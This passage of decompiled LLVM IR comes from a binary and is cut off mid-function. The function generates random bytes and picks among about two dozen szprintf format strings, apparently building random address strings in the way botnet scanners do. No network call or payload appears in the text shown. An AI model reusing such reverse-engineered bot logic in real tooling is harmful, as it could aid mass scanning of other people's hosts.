  %v0_8049c04 = load i32, i32* @ebx, align 4
  store i32 %v0_8049c04, i32* %stack_var_-8, align 4
  store i8 0, i8* @global_var_8061597.38, align 1
  store i8 0, i8* @global_var_8061598.39, align 8
  store i8 0, i8* @global_var_8061599.40, align 1
  store i8 0, i8* @global_var_806159a.41, align 2
  %v1_8049c24 = call i32 @random()
  %v2_8049c34 = ashr i32 %v1_8049c24, 31
  %v2_8049c37 = zext i32 %v1_8049c24 to i64
  %v4_8049c37 = zext i32 %v2_8049c34 to i64
  %v5_8049c37 = mul nuw i64 %v4_8049c37, 4294967296
  %v6_8049c37 = or i64 %v5_8049c37, %v2_8049c37
  %v10_8049c37 = srem i64 %v6_8049c37, 255
  %v11_8049c37 = trunc i64 %v10_8049c37 to i32
  store i32 %v11_8049c37, i32* @eax, align 4
  %v1_8049c3b = trunc i64 %v10_8049c37 to i8
  store i8 %v1_8049c3b, i8* @global_var_8061597.38, align 1
  %v0_8049c40 = call i32 @random()
  %v2_8049c50 = ashr i32 %v0_8049c40, 31
  %v2_8049c53 = zext i32 %v0_8049c40 to i64
  %v4_8049c53 = zext i32 %v2_8049c50 to i64
  %v5_8049c53 = mul nuw i64 %v4_8049c53, 4294967296
  %v6_8049c53 = or i64 %v5_8049c53, %v2_8049c53
  %v10_8049c53 = srem i64 %v6_8049c53, 255
  %v11_8049c53 = trunc i64 %v10_8049c53 to i32
  store i32 %v11_8049c53, i32* @eax, align 4
  %v1_8049c57 = trunc i64 %v10_8049c53 to i8
  store i8 %v1_8049c57, i8* @global_var_8061598.39, align 8
  %v0_8049c5c = call i32 @random()
  %v2_8049c6c = ashr i32 %v0_8049c5c, 31
  %v2_8049c6f = zext i32 %v0_8049c5c to i64
  %v4_8049c6f = zext i32 %v2_8049c6c to i64
  %v5_8049c6f = mul nuw i64 %v4_8049c6f, 4294967296
  %v6_8049c6f = or i64 %v5_8049c6f, %v2_8049c6f
  %v10_8049c6f = srem i64 %v6_8049c6f, 255
  %v11_8049c6f = trunc i64 %v10_8049c6f to i32
  store i32 %v11_8049c6f, i32* @eax, align 4
  %v1_8049c73 = trunc i64 %v10_8049c6f to i8
  store i8 %v1_8049c73, i8* @global_var_8061599.40, align 1
  %v0_8049c78 = call i32 @random()
  %v2_8049c88 = ashr i32 %v0_8049c78, 31
  %v2_8049c8b = zext i32 %v0_8049c78 to i64
  %v4_8049c8b = zext i32 %v2_8049c88 to i64
  %v5_8049c8b = mul nuw i64 %v4_8049c8b, 4294967296
  %v6_8049c8b = or i64 %v5_8049c8b, %v2_8049c8b
  %v10_8049c8b = srem i64 %v6_8049c8b, 255
  %v11_8049c8b = trunc i64 %v10_8049c8b to i32
  store i32 %v11_8049c8b, i32* @eax, align 4
  %v1_8049c8f = trunc i64 %v10_8049c8b to i8
  store i8 %v1_8049c8f, i8* @global_var_806159a.41, align 2
  %v0_8049c94 = call i32 @random()
  %v2_8049ca4 = ashr i32 %v0_8049c94, 31
  %v2_8049ca7 = zext i32 %v0_8049c94 to i64
  %v4_8049ca7 = zext i32 %v2_8049ca4 to i64
  %v5_8049ca7 = mul nuw i64 %v4_8049ca7, 4294967296
  %v6_8049ca7 = or i64 %v5_8049ca7, %v2_8049ca7
  %v10_8049ca7 = srem i64 %v6_8049ca7, 115
  %v11_8049ca7 = trunc i64 %v10_8049ca7 to i32
  store i32 %v11_8049ca7, i32* @edx, align 4
  %v4_8049cac = icmp eq i32 %v11_8049ca7, 0
  %v1_8049cb0 = icmp eq i1 %v4_8049cac, false
  br i1 %v1_8049cb0, label %dec_label_pc_8049cdc, label %dec_label_pc_8049cb2

dec_label_pc_8049cb2:                             ; preds = %entry
  %v0_8049cb2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049cb2 = zext i8 %v0_8049cb2 to i32
  store i32 %v1_8049cb2, i32* @edx, align 4
  %v0_8049cbe = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049cbe = zext i8 %v0_8049cbe to i32
  %v2_8049ccd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ccd, i32* @ebx, align 4
  %v5_8049cd4 = call i32 @szprintf(i32 %v2_8049ccd, i32 ptrtoint ([13 x i8]* @global_var_8057163.42 to i32), i32 %v1_8049cbe, i32 %v1_8049cb2)
  br label %dec_label_pc_8049cdc

dec_label_pc_8049cdc:                             ; preds = %entry, %dec_label_pc_8049cb2
  %v12_8049cdc = icmp eq i32 %v11_8049ca7, 1
  %v1_8049ce0 = icmp eq i1 %v12_8049cdc, false
  br i1 %v1_8049ce0, label %dec_label_pc_8049d0c, label %dec_label_pc_8049ce2

dec_label_pc_8049ce2:                             ; preds = %dec_label_pc_8049cdc
  %v0_8049ce2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049ce2 = zext i8 %v0_8049ce2 to i32
  store i32 %v1_8049ce2, i32* @edx, align 4
  %v0_8049cee = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049cee = zext i8 %v0_8049cee to i32
  %v2_8049cfd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049cfd, i32* @ebx, align 4
  %v5_8049d04 = call i32 @szprintf(i32 %v2_8049cfd, i32 ptrtoint ([13 x i8]* @global_var_8057170.43 to i32), i32 %v1_8049cee, i32 %v1_8049ce2)
  br label %dec_label_pc_8049d0c

dec_label_pc_8049d0c:                             ; preds = %dec_label_pc_8049cdc, %dec_label_pc_8049ce2
  %v12_8049d0c = icmp eq i32 %v11_8049ca7, 2
  %v1_8049d10 = icmp eq i1 %v12_8049d0c, false
  br i1 %v1_8049d10, label %dec_label_pc_8049d3c, label %dec_label_pc_8049d12

dec_label_pc_8049d12:                             ; preds = %dec_label_pc_8049d0c
  %v0_8049d12 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049d12 = zext i8 %v0_8049d12 to i32
  store i32 %v1_8049d12, i32* @edx, align 4
  %v0_8049d1e = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049d1e = zext i8 %v0_8049d1e to i32
  %v2_8049d2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d2d, i32* @ebx, align 4
  %v5_8049d34 = call i32 @szprintf(i32 %v2_8049d2d, i32 ptrtoint ([11 x i8]* @global_var_805717d.44 to i32), i32 %v1_8049d1e, i32 %v1_8049d12)
  br label %dec_label_pc_8049d3c

dec_label_pc_8049d3c:                             ; preds = %dec_label_pc_8049d0c, %dec_label_pc_8049d12
  %v12_8049d3c = icmp eq i32 %v11_8049ca7, 3
  %v1_8049d40 = icmp eq i1 %v12_8049d3c, false
  br i1 %v1_8049d40, label %dec_label_pc_8049d6c, label %dec_label_pc_8049d42

dec_label_pc_8049d42:                             ; preds = %dec_label_pc_8049d3c
  %v0_8049d42 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049d42 = zext i8 %v0_8049d42 to i32
  store i32 %v1_8049d42, i32* @edx, align 4
  %v0_8049d4e = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049d4e = zext i8 %v0_8049d4e to i32
  %v2_8049d5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d5d, i32* @ebx, align 4
  %v5_8049d64 = call i32 @szprintf(i32 %v2_8049d5d, i32 ptrtoint ([13 x i8]* @global_var_8057188.45 to i32), i32 %v1_8049d4e, i32 %v1_8049d42)
  br label %dec_label_pc_8049d6c

dec_label_pc_8049d6c:                             ; preds = %dec_label_pc_8049d3c, %dec_label_pc_8049d42
  %v12_8049d6c = icmp eq i32 %v11_8049ca7, 4
  %v1_8049d70 = icmp eq i1 %v12_8049d6c, false
  br i1 %v1_8049d70, label %dec_label_pc_8049d9c, label %dec_label_pc_8049d72

dec_label_pc_8049d72:                             ; preds = %dec_label_pc_8049d6c
  %v0_8049d72 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049d72 = zext i8 %v0_8049d72 to i32
  store i32 %v1_8049d72, i32* @edx, align 4
  %v0_8049d7e = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049d7e = zext i8 %v0_8049d7e to i32
  %v2_8049d8d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d8d, i32* @ebx, align 4
  %v5_8049d94 = call i32 @szprintf(i32 %v2_8049d8d, i32 ptrtoint ([11 x i8]* @global_var_8057195.46 to i32), i32 %v1_8049d7e, i32 %v1_8049d72)
  br label %dec_label_pc_8049d9c

dec_label_pc_8049d9c:                             ; preds = %dec_label_pc_8049d6c, %dec_label_pc_8049d72
  %v12_8049d9c = icmp eq i32 %v11_8049ca7, 5
  %v1_8049da0 = icmp eq i1 %v12_8049d9c, false
  br i1 %v1_8049da0, label %dec_label_pc_8049dcc, label %dec_label_pc_8049da2

dec_label_pc_8049da2:                             ; preds = %dec_label_pc_8049d9c
  %v0_8049da2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049da2 = zext i8 %v0_8049da2 to i32
  store i32 %v1_8049da2, i32* @edx, align 4
  %v0_8049dae = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049dae = zext i8 %v0_8049dae to i32
  %v2_8049dbd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dbd, i32* @ebx, align 4
  %v5_8049dc4 = call i32 @szprintf(i32 %v2_8049dbd, i32 ptrtoint ([13 x i8]* @global_var_80571a0.47 to i32), i32 %v1_8049dae, i32 %v1_8049da2)
  br label %dec_label_pc_8049dcc

dec_label_pc_8049dcc:                             ; preds = %dec_label_pc_8049d9c, %dec_label_pc_8049da2
  %v12_8049dcc = icmp eq i32 %v11_8049ca7, 6
  %v1_8049dd0 = icmp eq i1 %v12_8049dcc, false
  br i1 %v1_8049dd0, label %dec_label_pc_8049dfc, label %dec_label_pc_8049dd2

dec_label_pc_8049dd2:                             ; preds = %dec_label_pc_8049dcc
  %v0_8049dd2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049dd2 = zext i8 %v0_8049dd2 to i32
  store i32 %v1_8049dd2, i32* @edx, align 4
  %v0_8049dde = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049dde = zext i8 %v0_8049dde to i32
  %v2_8049ded = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ded, i32* @ebx, align 4
  %v5_8049df4 = call i32 @szprintf(i32 %v2_8049ded, i32 ptrtoint ([12 x i8]* @global_var_80571ad.48 to i32), i32 %v1_8049dde, i32 %v1_8049dd2)
  br label %dec_label_pc_8049dfc

dec_label_pc_8049dfc:                             ; preds = %dec_label_pc_8049dcc, %dec_label_pc_8049dd2
  %v12_8049dfc = icmp eq i32 %v11_8049ca7, 7
  %v1_8049e00 = icmp eq i1 %v12_8049dfc, false
  br i1 %v1_8049e00, label %dec_label_pc_8049e2c, label %dec_label_pc_8049e02

dec_label_pc_8049e02:                             ; preds = %dec_label_pc_8049dfc
  %v0_8049e02 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049e02 = zext i8 %v0_8049e02 to i32
  store i32 %v1_8049e02, i32* @edx, align 4
  %v0_8049e0e = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049e0e = zext i8 %v0_8049e0e to i32
  %v2_8049e1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e1d, i32* @ebx, align 4
  %v5_8049e24 = call i32 @szprintf(i32 %v2_8049e1d, i32 ptrtoint ([13 x i8]* @global_var_80571b9.49 to i32), i32 %v1_8049e0e, i32 %v1_8049e02)
  br label %dec_label_pc_8049e2c

dec_label_pc_8049e2c:                             ; preds = %dec_label_pc_8049dfc, %dec_label_pc_8049e02
  %v12_8049e2c = icmp eq i32 %v11_8049ca7, 8
  %v1_8049e30 = icmp eq i1 %v12_8049e2c, false
  br i1 %v1_8049e30, label %dec_label_pc_8049e5c, label %dec_label_pc_8049e32

dec_label_pc_8049e32:                             ; preds = %dec_label_pc_8049e2c
  %v0_8049e32 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049e32 = zext i8 %v0_8049e32 to i32
  store i32 %v1_8049e32, i32* @edx, align 4
  %v0_8049e3e = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049e3e = zext i8 %v0_8049e3e to i32
  %v2_8049e4d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e4d, i32* @ebx, align 4
  %v5_8049e54 = call i32 @szprintf(i32 %v2_8049e4d, i32 ptrtoint ([13 x i8]* @global_var_80571c6.50 to i32), i32 %v1_8049e3e, i32 %v1_8049e32)
  br label %dec_label_pc_8049e5c

dec_label_pc_8049e5c:                             ; preds = %dec_label_pc_8049e2c, %dec_label_pc_8049e32
  %v12_8049e5c = icmp eq i32 %v11_8049ca7, 9
  %v1_8049e60 = icmp eq i1 %v12_8049e5c, false
  br i1 %v1_8049e60, label %dec_label_pc_8049e8c, label %dec_label_pc_8049e62

dec_label_pc_8049e62:                             ; preds = %dec_label_pc_8049e5c
  %v0_8049e62 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049e62 = zext i8 %v0_8049e62 to i32
  store i32 %v1_8049e62, i32* @edx, align 4
  %v0_8049e6e = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049e6e = zext i8 %v0_8049e6e to i32
  %v2_8049e7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e7d, i32* @ebx, align 4
  %v5_8049e84 = call i32 @szprintf(i32 %v2_8049e7d, i32 ptrtoint ([13 x i8]* @global_var_80571d3.51 to i32), i32 %v1_8049e6e, i32 %v1_8049e62)
  br label %dec_label_pc_8049e8c

dec_label_pc_8049e8c:                             ; preds = %dec_label_pc_8049e5c, %dec_label_pc_8049e62
  %v12_8049e8c = icmp eq i32 %v11_8049ca7, 10
  %v1_8049e90 = icmp eq i1 %v12_8049e8c, false
  br i1 %v1_8049e90, label %dec_label_pc_8049ebc, label %dec_label_pc_8049e92

dec_label_pc_8049e92:                             ; preds = %dec_label_pc_8049e8c
  %v0_8049e92 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049e92 = zext i8 %v0_8049e92 to i32
  store i32 %v1_8049e92, i32* @edx, align 4
  %v0_8049e9e = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049e9e = zext i8 %v0_8049e9e to i32
  %v2_8049ead = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ead, i32* @ebx, align 4
  %v5_8049eb4 = call i32 @szprintf(i32 %v2_8049ead, i32 ptrtoint ([13 x i8]* @global_var_80571e0.52 to i32), i32 %v1_8049e9e, i32 %v1_8049e92)
  br label %dec_label_pc_8049ebc

dec_label_pc_8049ebc:                             ; preds = %dec_label_pc_8049e8c, %dec_label_pc_8049e92
  %v12_8049ebc = icmp eq i32 %v11_8049ca7, 11
  %v1_8049ec0 = icmp eq i1 %v12_8049ebc, false
  br i1 %v1_8049ec0, label %dec_label_pc_8049eec, label %dec_label_pc_8049ec2

dec_label_pc_8049ec2:                             ; preds = %dec_label_pc_8049ebc
  %v0_8049ec2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049ec2 = zext i8 %v0_8049ec2 to i32
  store i32 %v1_8049ec2, i32* @edx, align 4
  %v0_8049ece = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049ece = zext i8 %v0_8049ece to i32
  %v2_8049edd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049edd, i32* @ebx, align 4
  %v5_8049ee4 = call i32 @szprintf(i32 %v2_8049edd, i32 ptrtoint ([11 x i8]* @global_var_80571ed.53 to i32), i32 %v1_8049ece, i32 %v1_8049ec2)
  br label %dec_label_pc_8049eec

dec_label_pc_8049eec:                             ; preds = %dec_label_pc_8049ebc, %dec_label_pc_8049ec2
  %v12_8049eec = icmp eq i32 %v11_8049ca7, 12
  %v1_8049ef0 = icmp eq i1 %v12_8049eec, false
  br i1 %v1_8049ef0, label %dec_label_pc_8049f1c, label %dec_label_pc_8049ef2

dec_label_pc_8049ef2:                             ; preds = %dec_label_pc_8049eec
  %v0_8049ef2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049ef2 = zext i8 %v0_8049ef2 to i32
  store i32 %v1_8049ef2, i32* @edx, align 4
  %v0_8049efe = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049efe = zext i8 %v0_8049efe to i32
  %v2_8049f0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f0d, i32* @ebx, align 4
  %v5_8049f14 = call i32 @szprintf(i32 %v2_8049f0d, i32 ptrtoint ([13 x i8]* @global_var_8057170.43 to i32), i32 %v1_8049efe, i32 %v1_8049ef2)
  br label %dec_label_pc_8049f1c

dec_label_pc_8049f1c:                             ; preds = %dec_label_pc_8049eec, %dec_label_pc_8049ef2
  %v12_8049f1c = icmp eq i32 %v11_8049ca7, 13
  %v1_8049f20 = icmp eq i1 %v12_8049f1c, false
  br i1 %v1_8049f20, label %dec_label_pc_8049f4c, label %dec_label_pc_8049f22

dec_label_pc_8049f22:                             ; preds = %dec_label_pc_8049f1c
  %v0_8049f22 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049f22 = zext i8 %v0_8049f22 to i32
  store i32 %v1_8049f22, i32* @edx, align 4
  %v0_8049f2e = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049f2e = zext i8 %v0_8049f2e to i32
  %v2_8049f3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f3d, i32* @ebx, align 4
  %v5_8049f44 = call i32 @szprintf(i32 %v2_8049f3d, i32 ptrtoint ([13 x i8]* @global_var_80571f8.54 to i32), i32 %v1_8049f2e, i32 %v1_8049f22)
  br label %dec_label_pc_8049f4c

dec_label_pc_8049f4c:                             ; preds = %dec_label_pc_8049f1c, %dec_label_pc_8049f22
  %v12_8049f4c = icmp eq i32 %v11_8049ca7, 14
  %v1_8049f50 = icmp eq i1 %v12_8049f4c, false
  br i1 %v1_8049f50, label %dec_label_pc_8049f7c, label %dec_label_pc_8049f52

dec_label_pc_8049f52:                             ; preds = %dec_label_pc_8049f4c
  %v0_8049f52 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049f52 = zext i8 %v0_8049f52 to i32
  store i32 %v1_8049f52, i32* @edx, align 4
  %v0_8049f5e = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049f5e = zext i8 %v0_8049f5e to i32
  %v2_8049f6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f6d, i32* @ebx, align 4
  %v5_8049f74 = call i32 @szprintf(i32 %v2_8049f6d, i32 ptrtoint ([13 x i8]* @global_var_8057205.55 to i32), i32 %v1_8049f5e, i32 %v1_8049f52)
  br label %dec_label_pc_8049f7c

dec_label_pc_8049f7c:                             ; preds = %dec_label_pc_8049f4c, %dec_label_pc_8049f52
  %v12_8049f7c = icmp eq i32 %v11_8049ca7, 15
  %v1_8049f80 = icmp eq i1 %v12_8049f7c, false
  br i1 %v1_8049f80, label %dec_label_pc_8049fac, label %dec_label_pc_8049f82

dec_label_pc_8049f82:                             ; preds = %dec_label_pc_8049f7c
  %v0_8049f82 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049f82 = zext i8 %v0_8049f82 to i32
  store i32 %v1_8049f82, i32* @edx, align 4
  %v0_8049f8e = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049f8e = zext i8 %v0_8049f8e to i32
  %v2_8049f9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f9d, i32* @ebx, align 4
  %v5_8049fa4 = call i32 @szprintf(i32 %v2_8049f9d, i32 ptrtoint ([13 x i8]* @global_var_8057212.56 to i32), i32 %v1_8049f8e, i32 %v1_8049f82)
  br label %dec_label_pc_8049fac

dec_label_pc_8049fac:                             ; preds = %dec_label_pc_8049f7c, %dec_label_pc_8049f82
  %v9_8049fac = icmp eq i32 %v11_8049ca7, 16
  %v1_8049fb0 = icmp eq i1 %v9_8049fac, false
  br i1 %v1_8049fb0, label %dec_label_pc_8049fdc, label %dec_label_pc_8049fb2

dec_label_pc_8049fb2:                             ; preds = %dec_label_pc_8049fac
  %v0_8049fb2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049fb2 = zext i8 %v0_8049fb2 to i32
  store i32 %v1_8049fb2, i32* @edx, align 4
  %v0_8049fbe = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049fbe = zext i8 %v0_8049fbe to i32
  %v2_8049fcd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fcd, i32* @ebx, align 4
  %v5_8049fd4 = call i32 @szprintf(i32 %v2_8049fcd, i32 ptrtoint ([13 x i8]* @global_var_805721f.57 to i32), i32 %v1_8049fbe, i32 %v1_8049fb2)
  br label %dec_label_pc_8049fdc

dec_label_pc_8049fdc:                             ; preds = %dec_label_pc_8049fac, %dec_label_pc_8049fb2
  %v12_8049fdc = icmp eq i32 %v11_8049ca7, 17
  %v1_8049fe0 = icmp eq i1 %v12_8049fdc, false
  br i1 %v1_8049fe0, label %dec_label_pc_804a00c, label %dec_label_pc_8049fe2

dec_label_pc_8049fe2:                             ; preds = %dec_label_pc_8049fdc
  %v0_8049fe2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_8049fe2 = zext i8 %v0_8049fe2 to i32
  store i32 %v1_8049fe2, i32* @edx, align 4
  %v0_8049fee = load i8, i8* @global_var_8061599.40, align 1
  %v1_8049fee = zext i8 %v0_8049fee to i32
  %v2_8049ffd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ffd, i32* @ebx, align 4
  %v5_804a004 = call i32 @szprintf(i32 %v2_8049ffd, i32 ptrtoint ([13 x i8]* @global_var_805722c.58 to i32), i32 %v1_8049fee, i32 %v1_8049fe2)
  br label %dec_label_pc_804a00c

dec_label_pc_804a00c:                             ; preds = %dec_label_pc_8049fdc, %dec_label_pc_8049fe2
  %v12_804a00c = icmp eq i32 %v11_8049ca7, 18
  %v1_804a010 = icmp eq i1 %v12_804a00c, false
  br i1 %v1_804a010, label %dec_label_pc_804a03c, label %dec_label_pc_804a012

dec_label_pc_804a012:                             ; preds = %dec_label_pc_804a00c
  %v0_804a012 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a012 = zext i8 %v0_804a012 to i32
  store i32 %v1_804a012, i32* @edx, align 4
  %v0_804a01e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a01e = zext i8 %v0_804a01e to i32
  %v2_804a02d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a02d, i32* @ebx, align 4
  %v5_804a034 = call i32 @szprintf(i32 %v2_804a02d, i32 ptrtoint ([13 x i8]* @global_var_8057239.59 to i32), i32 %v1_804a01e, i32 %v1_804a012)
  br label %dec_label_pc_804a03c

dec_label_pc_804a03c:                             ; preds = %dec_label_pc_804a00c, %dec_label_pc_804a012
  %v12_804a03c = icmp eq i32 %v11_8049ca7, 19
  %v1_804a040 = icmp eq i1 %v12_804a03c, false
  br i1 %v1_804a040, label %dec_label_pc_804a06c, label %dec_label_pc_804a042

dec_label_pc_804a042:                             ; preds = %dec_label_pc_804a03c
  %v0_804a042 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a042 = zext i8 %v0_804a042 to i32
  store i32 %v1_804a042, i32* @edx, align 4
  %v0_804a04e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a04e = zext i8 %v0_804a04e to i32
  %v2_804a05d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a05d, i32* @ebx, align 4
  %v5_804a064 = call i32 @szprintf(i32 %v2_804a05d, i32 ptrtoint ([11 x i8]* @global_var_8057246.60 to i32), i32 %v1_804a04e, i32 %v1_804a042)
  br label %dec_label_pc_804a06c

dec_label_pc_804a06c:                             ; preds = %dec_label_pc_804a03c, %dec_label_pc_804a042
  %v12_804a06c = icmp eq i32 %v11_8049ca7, 20
  %v1_804a070 = icmp eq i1 %v12_804a06c, false
  br i1 %v1_804a070, label %dec_label_pc_804a09c, label %dec_label_pc_804a072

dec_label_pc_804a072:                             ; preds = %dec_label_pc_804a06c
  %v0_804a072 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a072 = zext i8 %v0_804a072 to i32
  store i32 %v1_804a072, i32* @edx, align 4
  %v0_804a07e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a07e = zext i8 %v0_804a07e to i32
  %v2_804a08d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a08d, i32* @ebx, align 4
  %v5_804a094 = call i32 @szprintf(i32 %v2_804a08d, i32 ptrtoint ([12 x i8]* @global_var_8057251.61 to i32), i32 %v1_804a07e, i32 %v1_804a072)
  br label %dec_label_pc_804a09c

dec_label_pc_804a09c:                             ; preds = %dec_label_pc_804a06c, %dec_label_pc_804a072
  %v12_804a09c = icmp eq i32 %v11_8049ca7, 21
  %v1_804a0a0 = icmp eq i1 %v12_804a09c, false
  br i1 %v1_804a0a0, label %dec_label_pc_804a0cc, label %dec_label_pc_804a0a2

dec_label_pc_804a0a2:                             ; preds = %dec_label_pc_804a09c
  %v0_804a0a2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a0a2 = zext i8 %v0_804a0a2 to i32
  store i32 %v1_804a0a2, i32* @edx, align 4
  %v0_804a0ae = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a0ae = zext i8 %v0_804a0ae to i32
  %v2_804a0bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0bd, i32* @ebx, align 4
  %v5_804a0c4 = call i32 @szprintf(i32 %v2_804a0bd, i32 ptrtoint ([13 x i8]* @global_var_805725d.62 to i32), i32 %v1_804a0ae, i32 %v1_804a0a2)
  br label %dec_label_pc_804a0cc

dec_label_pc_804a0cc:                             ; preds = %dec_label_pc_804a09c, %dec_label_pc_804a0a2
  %v12_804a0cc = icmp eq i32 %v11_8049ca7, 22
  %v1_804a0d0 = icmp eq i1 %v12_804a0cc, false
  br i1 %v1_804a0d0, label %dec_label_pc_804a0fc, label %dec_label_pc_804a0d2

dec_label_pc_804a0d2:                             ; preds = %dec_label_pc_804a0cc
  %v0_804a0d2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a0d2 = zext i8 %v0_804a0d2 to i32
  store i32 %v1_804a0d2, i32* @edx, align 4
  %v0_804a0de = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a0de = zext i8 %v0_804a0de to i32
  %v2_804a0ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0ed, i32* @ebx, align 4
  %v5_804a0f4 = call i32 @szprintf(i32 %v2_804a0ed, i32 ptrtoint ([11 x i8]* @global_var_805726a.63 to i32), i32 %v1_804a0de, i32 %v1_804a0d2)
  br label %dec_label_pc_804a0fc

dec_label_pc_804a0fc:                             ; preds = %dec_label_pc_804a0cc, %dec_label_pc_804a0d2
  %v12_804a0fc = icmp eq i32 %v11_8049ca7, 23
  %v1_804a100 = icmp eq i1 %v12_804a0fc, false
  br i1 %v1_804a100, label %dec_label_pc_804a12c, label %dec_label_pc_804a102

dec_label_pc_804a102:                             ; preds = %dec_label_pc_804a0fc
  %v0_804a102 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a102 = zext i8 %v0_804a102 to i32
  store i32 %v1_804a102, i32* @edx, align 4
  %v0_804a10e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a10e = zext i8 %v0_804a10e to i32
  %v2_804a11d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a11d, i32* @ebx, align 4
  %v5_804a124 = call i32 @szprintf(i32 %v2_804a11d, i32 ptrtoint ([11 x i8]* @global_var_8057275.64 to i32), i32 %v1_804a10e, i32 %v1_804a102)
  br label %dec_label_pc_804a12c

dec_label_pc_804a12c:                             ; preds = %dec_label_pc_804a0fc, %dec_label_pc_804a102
  %v12_804a12c = icmp eq i32 %v11_8049ca7, 24
  %v1_804a130 = icmp eq i1 %v12_804a12c, false
  br i1 %v1_804a130, label %dec_label_pc_804a15c, label %dec_label_pc_804a132

dec_label_pc_804a132:                             ; preds = %dec_label_pc_804a12c
  %v0_804a132 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a132 = zext i8 %v0_804a132 to i32
  store i32 %v1_804a132, i32* @edx, align 4
  %v0_804a13e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a13e = zext i8 %v0_804a13e to i32
  %v2_804a14d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a14d, i32* @ebx, align 4
  %v5_804a154 = call i32 @szprintf(i32 %v2_804a14d, i32 ptrtoint ([12 x i8]* @global_var_8057280.65 to i32), i32 %v1_804a13e, i32 %v1_804a132)
  br label %dec_label_pc_804a15c

dec_label_pc_804a15c:                             ; preds = %dec_label_pc_804a12c, %dec_label_pc_804a132
  %v12_804a15c = icmp eq i32 %v11_8049ca7, 25
  %v1_804a160 = icmp eq i1 %v12_804a15c, false
  br i1 %v1_804a160, label %dec_label_pc_804a18c, label %dec_label_pc_804a162

dec_label_pc_804a162:                             ; preds = %dec_label_pc_804a15c
  %v0_804a162 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a162 = zext i8 %v0_804a162 to i32
  store i32 %v1_804a162, i32* @edx, align 4
  %v0_804a16e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a16e = zext i8 %v0_804a16e to i32
  %v2_804a17d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a17d, i32* @ebx, align 4
  %v5_804a184 = call i32 @szprintf(i32 %v2_804a17d, i32 ptrtoint ([12 x i8]* @global_var_805728c.66 to i32), i32 %v1_804a16e, i32 %v1_804a162)
  br label %dec_label_pc_804a18c

dec_label_pc_804a18c:                             ; preds = %dec_label_pc_804a15c, %dec_label_pc_804a162
  %v12_804a18c = icmp eq i32 %v11_8049ca7, 26
  %v1_804a190 = icmp eq i1 %v12_804a18c, false
